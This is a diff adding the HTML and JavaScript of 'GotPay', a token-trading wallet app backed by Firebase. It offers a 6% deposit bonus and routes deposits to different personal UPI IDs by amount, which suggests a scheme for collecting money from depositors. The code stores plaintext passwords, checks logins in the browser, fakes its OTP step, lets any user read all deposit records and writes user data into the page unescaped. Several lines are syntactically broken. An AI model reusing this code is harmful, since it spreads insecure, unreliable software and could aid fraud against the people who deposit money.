@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GotPay - Professional Digital Wallet</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --primary: #0056D2; --secondary: #003b8e; --bg: #f4f7f6; --text: #333; --success: #4caf50; --danger: #e53935; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: var(--bg); color: var(--text); -webkit-tap-highlight-color: transparent; }
+        
+        /* App Container */
+        .app-container { max-width: 400px; margin: auto; background: white; min-height: 100vh; position: relative; padding-bottom: 80px; box-shadow: 0 0 20px rgba(0,0,0,0.1); overflow-x: hidden; }
+        
+        /* Auth Pages */
+        .auth-page { display: none; padding: 40px 25px; text-align: center; height: 100vh; background: white; }
+        .auth-page.active { display: block; }
+        .logo { font-size: 42px; color: var(--primary); font-weight: 900; margin-bottom: 5px; }
+        .logo span { color: #ff9800; }
+        .input-group { position: relative; margin-top: 15px; text-align: left; }
+        .input-field { width: 100%; padding: 14px; border: 1.5px solid #e0e0e0; border-radius: 12px; font-size: 14px; background: #fafafa; outline: none; transition: 0.3s; }
+        .input-field:focus { border-color: var(--primary); background: white; }
+        .otp-btn { position: absolute; right: 8px; top: 8px; background: var(--primary); color: white; border: none; padding: 8px 12px; border-radius: 8px; font-size: 12px; cursor: pointer; }
+        .primary-btn { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 25px; box-shadow: 0 4px 15px rgba(0, 86, 210, 0.3); }
+        .switch-link { margin-top: 20px; color: var(--primary); font-size: 14px; cursor: pointer; font-weight: 600; }
+
+        /* Dashboard Pages */
+        .page-content { display: none; padding: 15px; }
+        .page-content.active { display: block; }
+        
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 5px; }
+        .user-badge { display: flex; align-items: center; gap: 10px; }
+        .avatar { width: 45px; height: 45px; background: #e3f2fd; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--primary); font-size: 20px; font-weight: bold; }
+        
+        .balance-card { background: linear-gradient(135deg, #1e3c72, #2a5298); margin: 15px 0; border-radius: 18px; padding: 25px 20px; color: white; box-shadow: 0 8px 20px rgba(30, 60, 114, 0.3); text-align: center; }
+        .balance-card h1 { font-size: 36px; margin: 10px 0; font-weight: 900; }
+        
+        .card-box { background: white; padding: 20px; border-radius: 14px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border: 1px solid #f0f0f0; margin-bottom: 15px; }
+        .select-field { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 14px; background: #fafafa; outline: none; }
+        
+        .list-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f0f0f0; }
+        .remove-btn { background: #ffebee; color: var(--danger); border: none; padding: 5px 10px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: bold; }
+
+        /* Bottom Nav */
+        .nav { position: fixed; bottom: 0; width: 100%; max-width: 400px; background: white; display: flex; justify-content: space-around; padding: 12px 10px; box-shadow: 0 -4px 20px rgba(0,0,0,0.08); border-radius: 20px 20px 0 0; z-index: 1000; }
+        .nav-item { text-align: center; color: #999; font-size: 11px; display: flex; flex-direction: column;align-items: center; gap: 5px; cursor: pointer; flex: 1; }
+        .nav-item i { font-size: 20px; }
+        .nav-item.active { color: var(--primary); font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <!-- LOGIN PAGE -->
+        <div id="loginPage" class="auth-page active">
+            <h1 class="logo">Got<span>Pay</span></h1>
+            <p style="color:#666; margin-bottom:30px;">Login to your account</p>
+            <div class="input-group">
+                <input type="tel" id="loginPhone" class="input-field" placeholder="Mobile Number (10 Digits)" maxlength="10">
+            </div>
+            <div class="input-group">
+                <input type="password" id="loginPass" class="input-field" placeholder="Password">
+            </div>
+            <button class="primary-btn" onclick="loginUser()">Login</button>
+            <p class="switch-link" onclick="showPage('registerPage')">Create New Account</p>
+        </div>
+
+        <!-- REGISTER PAGE (NO OTP) -->
+        <div id="registerPage" class="auth-page">
+            <h1 class="logo">Got<span>Pay</span></h1>
+            <p style="color:#666; margin-bottom:20px;">Register Account</p>
+            <div class="input-group">
+                <input type="text" id="regName" class="input-field" placeholder="Username / Full Name">
+            </div>
+            <div class="input-group">
+                <input type="tel" id="regPhone" class="input-field" placeholder="Mobile Number" maxlength="10">
+            </div>
+            <div class="input-group">
+                <input type="password" id="regPass" class="input-field" placeholder="Set Password">
+            </div>
+            <button class="primary-btn" onclick="registerUser()">Register</button>
+            <p class="switch-link" onclick="showPage('loginPage')">Already registered? Login</p>
+        </div>
+
+        <!-- DASHBOARD APP -->
+        <div id="mainApp" style="display: none;">
+            
+            <!-- HOME PAGE -->
+            <div id="homePage" class="page-content active">
+                <div class="header">
+                    <div class="user-badge">
+                        <div class="avatar" id="avatarInitial">U</div>
+                        <div>
+                            <h3 id="displayUsername" style="color:#111; font-size:16px;">Loading...</h3>
+                            <p style="font-size:12px; color:#666;">UID: <strong id="displayUid">---</strong></p>
+                        </div>
+                    </div>
+                    <i class="fa-solid fa-power-off" style="color: var(--danger); font-size: 22px; cursor:pointer;" onclick="logout()"></i>
+                </div>
+
+                <div class="balance-card">
+                    <p style="font-size:14px; opacity:0.9;">Total Available Balance</p>
+                    <h1 id="userBalance">₹ 0.00</h1>
+                    <p style="font-size:12px; color:#a1c4fd;">1 USDT = ₹112.00</p>
+                </div>
+
+                <div class="card-box" style="display:flex; justify-content:space-around; text-align:center; padding:15px 10px;">
+                    <div onclick="switchTab('depositTab')" style="cursor:pointer; width:45%;">
+                        <i class="fa-solid fa-circle-arrow-up" style="color: var(--success); font-size:28px;"></i>
+                        <h4 style="margin-top:8px; color:#333;">Buy (Deposit)</h4>
+                    </div>
+                    <div style="width:1px; background:#eee;"></div>
+                    <div onclick="switchTab('withdrawTab')" style="cursor:pointer; width:45%;">
+                        <i class="fa-solid fa-circle-arrow-down" style="color: var(--danger); font-size:28px;"></i>
+                        <h4 style="margin-top:8px; color:#333;">Sell (Withdraw)</h4>
+                    </div>
+                </div>
+
+                <div class="card-box">
+                    <h3 style="margin-bottom:10px; color:#333;">Recent Activity</h3>
+                    <div id="homeHistoryList" style="font-size:13px; color:#666;">Loading...</div>
+                </div> </div>
+
+            <!-- DEPOSIT (BUY) PAGE -->
+            <div id="depositTab" class="page-content">
+                <h2>Buy Token (Deposit)</h2>
+                <p style="font-size:12px; color:var(--success); font-weight:bold; margin-bottom:15px;">🔥 Flat 6% Commission on all Deposits!</p>
+                
+                <div class="card-box">
+                    <label style="font-size:12px; font-weight:bold;">Select Payment Gateway:</label>
+                    <select id="buyGateway" class="select-field">
+                        <option value="MobiKwik">MobiKwik Gateway</option>
+                        <option value="Freecharge">Freecharge Gateway</option>
+                    </select>
+                    
+                    <label style="font-size:12px; font-weight:bold;">Enter Amount (₹):</label>
+                    <input type="number" id="depositAmount" class="input-field" placeholder="E.g. 500" oninput="calculateBonus()">
+                    
+                    <p style="font-size:13px; margin-top:10px; color:#555;">You will receive: <strong style="color:var(--success);">₹<span id="bonusDisplay">0</span></strong> <span style="font-size:11px;">(Incl. 6% Bonus)</span></p>
+
+                    <button class="primary-btn" onclick="generateDepositRequest()">Proceed to Pay</button>
+                </div>
+
+                <!-- QR Scanner Box -->
+                <div id="depositQRBox" class="card-box" style="display:none; text-align:center; border: 2px dashed var(--primary);">
+                    <h3 style="color:var(--primary);">Pay ₹<span id="depAmountDisplay">0</span></h3>
+                    <p style="font-size:12px; color:#666;">Via <span id="depGatewayDisplay"></span></p>
+                    <img id="qrImage" src="" style="width:180px; height:180px; margin:15px 0; border-radius:10px;">
+                    <p style="font-weight:bold; font-size:14px;">Admin UPI: <span id="adminUpiDisplay">yourupi@upi</span></p>
+                    
+                    <input type="text" id="utrInput" class="input-field" placeholder="Enter 12-Digit UTR Number" maxlength="12" style="margin-top:15px;">
+                    <button class="primary-btn" style="background: var(--success);" onclick="submitDepositUTR()">Confirm Payment</button>
+                </div>
+            </div>
+
+            <!-- WITHDRAW (SELL) PAGE -->
+            <div id="withdrawTab" class="page-content">
+                <h2>Sell Token (Withdraw)</h2>
+                <div class="card-box">
+                    <p style="text-align:center; font-size:14px; margin-bottom:15px;">Available: <strong id="withdrawBalDisplay" style="color:var(--success); font-size:20px;">₹0.00</strong></p>
+                    
+                    <label style="font-size:12px; font-weight:bold;">Withdrawal Amount (₹):</label>
+                    <input type="number" id="withdrawAmount" class="input-field" placeholder="E.g. 500">
+
+                    <label style="font-size:12px; font-weight:bold; margin-top:10px; display:block;">Select Your Linked UPI:</label>
+                    <select id="withdrawUpiSelect" class="select-field">
+                        <option value="">-- No UPI Linked (Add in Profile) --</option>
+                    </select>
+                    
+                    <button class="primary-btn" style="background: var(--danger);" onclick="submitWithdraw()">Withdraw Funds</button>
+                </div>
+            </div>
+
+            <!-- PROFILE (ADD/REMOVE UPI & HISTORY) -->
+            <div id="profileTab" class="page-content">
+                <h2 style="margin-bottom:15px;">Manage Accounts</h2>
+                
+                <!-- Add UPI Box (WITH OTP) -->
+                <div class="card-box">
+                    <h3 style="color:var(--primary); margin-bottom:5px;">Add New UPI</h3>
+                    <select id="bindUpiType" class="select-field">
+                        <option value="MobiKwik">MobiKwik</option>
+                        <option value="Paytm">Paytm</option>
+                        <option value="PhonePe">PhonePe</option> <option value="AmazonPay">AmazonPay</option>
+                        <option value="Paytm Business">Paytm Business</option>
+                    </select>
+                    <input type="text" id="bindUpiId" class="input-field" placeholder="Enter UPI ID (e.g. 9876543210@paytm)">
+                    
+                    <div class="input-group">
+                        <input type="text" id="bindOtp" class="input-field" placeholder="Enter OTP" maxlength="4">
+                        <button class="otp-btn" onclick="sendDemoOTP()">Get OTP</button>
+                    </div>
+
+                    <button class="primary-btn" style="padding:10px; margin-top:15px;" onclick="addUpi()">Link UPI</button>
+                </div>
+
+                <!-- Linked UPIs List -->
+                <div class="card-box">
+                    <h4 style="margin-bottom:10px;">Your Linked UPIs</h4>
+                    <div id="linkedUpiList" style="font-size:13px; color:#555;">Loading...</div>
+                </div>
+            </div>
+
+            <!-- BOTTOM NAVIGATION -->
+            <div class="nav">
+                <div class="nav-item active" onclick="switchTab('homePage', this)"><i class="fa-solid fa-house"></i><span>Home</span></div>
+                <div class="nav-item" onclick="switchTab('depositTab', this)"><i class="fa-solid fa-arrow-up"></i><span>Buy</span></div>
+                <div class="nav-item" onclick="switchTab('withdrawTab', this)"><i class="fa-solid fa-arrow-down"></i><span>Sell</span></div>
+                <div class="nav-item" onclick="switchTab('profileTab', this)"><i class="fa-solid fa-user"></i><span>Profile</span></div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- FIREBASE & JS LOGIC -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+        import { getDatabase, ref, set, get, push, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+        const firebaseConfig = {
+          apiKey: "AIzaSyCxU0-aRs0qnjrsdiTR5lojxnen8PwsxfU",
+          authDomain: "shakti-pay.firebaseapp.com",
+          databaseURL: "https://shakti-pay-default-rtdb.firebaseio.com",
+          projectId: "shakti-pay",
+          storageBucket: "shakti-pay.firebasestorage.app",
+          messagingSenderId: "603174782279",
+          appId: "1:603174782279:web:6220300ba1c4aff3597862"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        let currentUser = null; 
+        let currentBalance = 0;
+        let generatedOTP = "";
+
+        // --- UI ROUTING ---
+        window.showPage = (pageId) => {
+            document.querySelectorAll('.auth-page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+        window.switchTab = (tabId, element=null) => {
+            document.querySelectorAll('.page-content').forEach(p => p.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            if(element) {
+                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+                element.classList.add('active');
+            }
+        }
+
+        // --- OTP SIMULATOR (FOR UPI BINDING) ---
+        window.sendDemoOTP = () => {
+            generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
+            alert([GotPay Alert]\nYour OTP is: ${generatedOTP});
+        }
+
+        // --- AUTHENTICATION & UID LOGIC (NO OTP) ---
+        window.registerUser = async () => {
+            let name = document.getElementById('regName').value;
+            let phone = document.getElementById('regPhone').value;
+            let pass = document.getElementById('regPass').value;
+
+            if(!name  phone.length !== 10  !pass) return alert("Please fill all details correctly. Mobile number must be 10 digits.");
+
+            let userRef = ref(db, users/${phone});
+            let snap = await get(userRef);
+            if(snap.exists ()) return alert("Number already registered! Please Login.");
+
+            // Sequential UID Logic (100000 -> 100001)
+            let counterRef = ref(db, 'system/last_uid');
+            let counterSnap = await get(counterRef);
+            let newUid = counterSnap.exists() ? counterSnap.val() + 1 : 100000;
+
+            await set(userRef, {
+                username: name,
+                phone: phone,
+                password: pass,
+                uid: newUid,
+                balance: 0,
+                upis: {} // Empty Object for UPIs
+            });
+            await set(counterRef, newUid); // Update System Counter
+            
+            alert(Registration Successful!\nYour GotPay UID is: ${newUid});
+            showPage('loginPage');
+        }
+
+        window.loginUser = async () => {
+            let phone = document.getElementById('loginPhone').value;
+            let pass = document.getElementById('loginPass').value;
+            if(phone.length !== 10 || !pass) return alert("Enter valid details.");
+
+            let snap = await get(ref(db, users/${phone}));
+            if(!snap.exists()) return alert("Account not found!");
+            if(snap.val().password !== pass) return alert("Incorrect Password!");
+
+            localStorage.setItem("gotpay_session", phone);
+            loadDashboard(phone);
+        }
+
+        window.logout = () => {
+            localStorage.removeItem("gotpay_session");
+            document.getElementById('mainApp').style.display = 'none';
+            showPage('loginPage');
+        }
+
+        // --- LOAD DASHBOARD DATA ---
+        function loadDashboard(phone) {
+            document.querySelectorAll('.auth-page').forEach(p => p.classList.remove('active'));
+            document.getElementById('mainApp').style.display = 'block';
+
+            // Real-time User Data
+            onValue(ref(db, users/${phone}), (snapshot) => {
+                if(snapshot.exists()) {
+                    currentUser = snapshot.val();
+                    currentBalance = currentUser.balance || 0;
+                    
+                    document.getElementById('displayUsername').innerText = currentUser.username;
+                    document.getElementById('avatarInitial').innerText = currentUser.username.charAt(0).toUpperCase();
+                    document.getElementById('displayUid').innerText = currentUser.uid;
+                    document.getElementById('userBalance').innerText = '₹ ' + currentBalance.toFixed(2);
+                    document.getElementById('withdrawBalDisplay').innerText = '₹ ' + currentBalance.toFixed(2);
+
+                    renderUpiList();
+                }
+            });
+
+            // Real-time History (Home Page)
+            onValue(ref(db, 'deposit_requests'), renderHistory);
+        }
+
+        // Auto Login
+        let session = localStorage.getItem("gotpay_session");
+        if(session) loadDashboard(session);
+
+        // --- MANAGE UPIs (ADD WITH OTP / REMOVE) ---
+        function renderUpiList() {
+            let listHtml = "";
+            let selectHtml = '<option value="">-- Select Linked UPI --</option>';
+            
+            if(currentUser.upis && Object.keys(currentUser.upis).length > 0) {
+                for(let platform in currentUser.upis) {
+                    let upiId = currentUser.upis[platform];
+                    listHtml += 
+                        <div class="list-item">
+                            <div><strong style="color:var(--primary);">${platform}</strong><br><span style="font-size:12px;">${upiId}</span></div>
+                            <button class="remove-btn" onclick="removeUpi('${platform}')">Remove</button>
+                        </div>
+                    ;
+                    selectHtml += <option value="${upiId}">${platform} - ${upiId}</option>;
+                }
+            } else {
+                listHtml = "<p style='text-align:center; padding:10px;'>No UPI Linked.</p>";
+            }
+            document.getElementById('linkedUpiList').innerHTML = listHtml;
+            document.getElementById('withdrawUpiSelect').innerHTML = selectHtml;
+        }
+
+        window.addUpi = async () => {
+            let platform = document.getElementById('bindUpiType').value;
+            let upiId = document.getElementById('bindUpiId').value;
+            let otp = document.getElementById('bindOtp').value;
+
+            if(!upiId) return alert("Enter UPI ID");
+            if(otp !== generatedOTP || otp === "") return alert("Invalid OTP!");
+
+            await update(ref(db, users/${currentUser.phone}/upis), { [platform]: upiId });
+            alert(✅ ${platform} UPI Added Successfully!);
+            
+            // Fields Reset
+            document.getElementById('bindUpiId').value = "";
+            document.getElementById('bindOtp').value = "";
+            generatedOTP = ""; // Reset OTP after use
+        }
+
+        window.removeUpi = async (platform) => {
+            if(!confirm(Are you sure you want to remove ${platform} UPI?)) return;
+            await remove(ref(db, users/${currentUser.phone}/upis/${platform}));
+            alert(❌ ${platform} UPI Removed.);
+        }
+
+                // --- DEPOSIT SYSTEM (BUY + 6% BONUS + DYNAMIC UPI) ---
+        window.calculateBonus = () => {
+            let amt = Number(document.getElementById('depositAmount').value) || 0;
+            document.getElementById('bonusDisplay').innerText = (amt + (amt * 0.06)).toFixed(2);
+        }
+
+        window.generateDepositRequest = () => {
+            let amount = Number(document.getElementById('depositAmount').value);
+            let gateway = document.getElementById('buyGateway').value;
+            if(!amount || amount < 100 || amount > 10000) return alert("Deposit amount must be between ₹100 and ₹10000");
+
+            let adminUpi = ""; // खाली UPI वेरिएबल
+
+            // 🎯 अलग-अलग अमाउंट के लिए अलग-अलग UPI ID की सेटिंग:
+            if (amount <= 100) {
+                // अगर अमाउंट 100 रुपये या उससे कम है
+                adminUpi = "palakkumari01@fam"; 
+            } 
+            else if (amount <= 500) {
+                // अगर अमाउंट 101 से 500 रुपये के बीच है
+                adminUpi = "abhinavkumar0000112-2@okicici"; 
+            } 
+            else if (amount <= 2000) {
+                // अगर अमाउंट 501 से 2000 रुपये के बीच है
+                adminUpi = "abhikhtc@ptaxis"; 
+            } 
+            else {
+                // अगर अमाउंट 2000 रुपये से ज्यादा है (बड़ा अमाउंट)
+                adminUpi = "tarwey01@ptyes"; 
+            }
+            
+            // स्क्रीन पर डेटा अपडेट करना
+            document.getElementById('depAmountDisplay').innerText = amount;
+            document.getElementById('depGatewayDisplay').innerText = gateway;
+            document.getElementById('adminUpiDisplay').innerText = adminUpi;
+            
+            // QR Code जनरेट करना
+            let upiLink = `upi://pay?pa=${adminUpi}&pn=GotPay&am=${amount}&cu=INR`;
+            document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiLink)}`;
+            
+            document.getElementById('depositQRBox').style.display = 'block';
+        }
+
+        window.submitDepositUTR = async () => {
+            let utr = document.getElementById('utrInput').value;
+            let amount = Number(document.getElementById('depositAmount').value);
+            let gateway = document.getElementById('buyGateway').value;
+            let bonusAmount = amount + (amount * 0.06); // Calculates 6% Bonus to be sent to DB
+
+            if(utr.length < 10) return alert("Enter valid UTR number!");
+
+            await set(push(ref(db, 'deposit_requests')), {
+                phone: currentUser.phone,
+                username: currentUser.username,
+                uid: currentUser.uid,
+                original_amount: amount,
+                amount_with_bonus: bonusAmount, // Sent to Admin to approve this amount
+                gateway: gateway,
+                utr: utr,
+                status: "Pending",
+                timestamp: new Date().toISOString()
+            });
+
+            alert(✅ Deposit Request Sent!\nAmount: ₹${amount}\nBonus: 6%\nTotal Expected: ₹${bonusAmount});
+            document.getElementById('depositQRBox').style.display = 'none';
+            document.getElementById('utrInput').value = '';
+            document.getElementById('depositAmount').value = '';
+            switchTab('homePage');
+        }
+
+        // --- WITHDRAW SYSTEM (SELL) ---
+        window.submitWithdraw = async () => {
+            let amount = Number(document.getElementById('withdrawAmount').value);
+            let upi = document.getElementById('withdrawUpiSelect').value;
+
+            if(!amount || amount < 100) return alert("Minimum withdrawal is ₹100");
+            if(!upi) return alert("Please select a Linked UPI");
+            if(amount > currentBalance) return alert("Insufficient Balance!");
+
+            await set(push(ref(db, 'withdraw_requests')), { phone: currentUser.phone,
+                username: currentUser.username,
+                uid: currentUser.uid,
+                amount: amount,
+                upiId: upi,
+                status: "Pending",
+                timestamp: new Date().toISOString()
+            });
+
+            alert("✅ Withdrawal Request Submitted!");
+            document.getElementById('withdrawAmount').value = '';
+            switchTab('homePage');
+        }
+
+        // --- RENDER RECENT HISTORY ---
+        function renderHistory(snap) {
+            if(!currentUser) return;
+            let html = "";
+            let records = [];
+            snap.forEach(c => {
+                let d = c.val();
+                if(d.phone === currentUser.phone) records.push(d);
+            });
+            records.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            if(records.length === 0) {
+                html = "<p style='text-align:center;'>No recent activity.</p>";
+            } else {
+                records.slice(0, 5).forEach(r => { // Show last 5
+                    let color = r.status === 'Success' ? 'var(--success)' : (r.status === 'Rejected' ? 'var(--danger)' : '#ff9800');
+                    html += 
+                    <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #eee;">
+                        <div>
+                            <strong style="font-size:13px; color:#333;">Deposit <span style="color:white; background:${color}; padding:2px 5px; border-radius:4px; font-size:10px; margin-left:5px;">${r.status}</span></strong>
+                            <br><span style="font-size:10px;">${new Date(r.timestamp).toLocaleDateString()} | UTR: ${r.utr}</span>
+                        </div>
+                        <div style="color:var(--success); font-weight:bold; font-size:14px;">+₹${r.amount_with_bonus}</div>
+                    </div>;
+                });
+            }
+            document.getElementById('homeHistoryList').innerHTML = html;
+        }
+    </script>
+</body>
+</html>
